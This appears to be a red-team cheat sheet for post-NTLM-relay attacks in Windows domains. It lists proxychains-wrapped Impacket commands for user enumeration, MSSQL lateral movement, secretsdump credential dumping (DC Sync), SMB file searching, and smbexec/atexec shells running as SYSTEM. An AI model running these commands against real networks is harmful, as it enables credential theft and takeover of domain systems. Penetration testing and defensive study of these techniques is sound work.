# SOCKS (with NTLM relay)

## Tools: proxychains , lookupsid , secretsdump , mssqlclient , impacket , smbclient

#### 1) lookupsid

 - [proxychains] lookupsid.py DOMAIN/USER@IP -no-pass -domain-sids (Enumerate Users)

#### 2) mssqlclient

 - [proxychains] mssqlclient.py -windows-auth DOMAIN/USER@IP -no-pass (MSSQL lateral movement)

#### 3) secretsdump

 - [proxychains] secretsdump.py -no-pass 'DOMAIN'/'USER'@'IP' (See DC Sync)

#### 4) smbclient

 - [proxychains] smbclient.py -no-pass USER@IP (Search for files)

# Pseudo-shell (File write and read)

 - [proxychains] smbexec.py -no-pass DOMAIN/USER@IP

 - [proxychains] atexec.py -no-pass DOMAIN/USER/IP "COMMAND"

## System/Admin access is granted with the shell being NT Authority/System
